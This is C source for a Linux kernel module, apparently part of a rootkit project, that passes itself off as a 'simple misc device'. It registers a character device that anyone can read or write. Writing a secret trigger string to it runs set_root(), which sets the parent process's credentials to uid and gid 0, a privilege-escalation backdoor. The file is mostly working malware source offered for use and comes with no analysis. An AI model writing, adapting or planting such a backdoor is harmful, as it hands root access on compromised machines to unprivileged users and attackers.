#include <linux/init.h>
#include <linux/printk.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/stat.h>

#include "include/core.h"
#include "include/debug.h"


static int      __init mymisc_init(void);
static void     __exit mymisc_exit(void);
static int 	    mymisc_open(struct inode *i, struct file *f);
static int 	    mymisc_release(struct inode *i, struct file *f);
static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off);
static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off);
static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg);

int set_root(void);

static struct file_operations fops =
{
    .owner      	    = THIS_MODULE,
    .read       	    = mymisc_read,
    .write		        = mymisc_write,
    .open       	    = mymisc_open,
    .release    	    = mymisc_release,
    .unlocked_ioctl     = mymisc_ioctl
};


//https://github.com/torvalds/linux/blob/master/include/linux/miscdevice.h#L79
struct miscdevice mymisc = {
    .name = RK_DRIVER,
    .minor = MISC_DYNAMIC_MINOR,
    .fops = &fops,
    .mode = ( S_IRUGO |  S_IWUGO )
};


static int mymisc_open(struct inode *i, struct file *f)
{       
    RK_DEBUG("Device File Opened...!!!\n");
    return 0;
}

/*
** This function will be called when we close the Device file
*/

//release
static int mymisc_release(struct inode *i, struct file *f)
{       
        RK_DEBUG("Device File Closed...!!!\n");
        return 0;
}

//read
static ssize_t	mymisc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
{
        RK_DEBUG("Device have been read...!!!\n");
        return 0;
}


//write
static ssize_t	mymisc_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{   
        RK_DEBUG("Got payload : %s", buf);
        
        if (strcmp(buf, RK_PRIVESC) == 0)
        {
            RK_DEBUG("Blud wanted to get root\n");
            int ret;

            ret = set_root();
            if (ret < 0)
            {
                RK_DEBUG("Privesc failed with error: %d\n", ret);
                return ret;
            }
            else 
                {RK_DEBUG("Should have got root\n");}
        }   
        return len;        
}

//ioctl
static long 	mymisc_ioctl(struct file *file, unsigned int request, unsigned long arg)
{
    RK_DEBUG("Device with ioctl...!!!\n");
    return 0;
}

static int __init mymisc_init(void)
{

	int r;
	r = misc_register(&mymisc);
	if (r < 0)
    {
            RK_DEBUG("misc_register() failed: %d\n", r);
		    return r;
    }

    RK_DEBUG("Device successfully registered\n");       
	return 0;
}


static void __exit mymisc_exit(void)
{
    misc_deregister(&mymisc);
    RK_DEBUG("misc_register exit done !!!\n");

}

int set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return -1;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    //commit_creds(root);


    struct task_struct *parent;
    parent = current->real_parent; //https://github.com/torvalds/linux/blob/bf9aa14fc523d2763fc9a10672a709224e8fcaf4/include/linux/sched.h#L1028   
    // Commit the new credentials to the parent process
    if (parent) {
        task_lock(parent); // Lock to modify safely
        parent->real_cred = root;
        parent->cred = root;
        task_unlock(parent); // Unlock after modification
        RK_DEBUG("rootkit: Parent process privileges escalated successfully.\n"); 

    } else {
        RK_DEBUG("rootkit: Parent task not found.\n");
        return 1;
    }
    return 0;
}    

module_init(mymisc_init)
module_exit(mymisc_exit)

MODULE_LICENSE("");
MODULE_AUTHOR("en vrai j'ai une privesc ca va");
MODULE_DESCRIPTION("simple misc device");
MODULE_VERSION("");

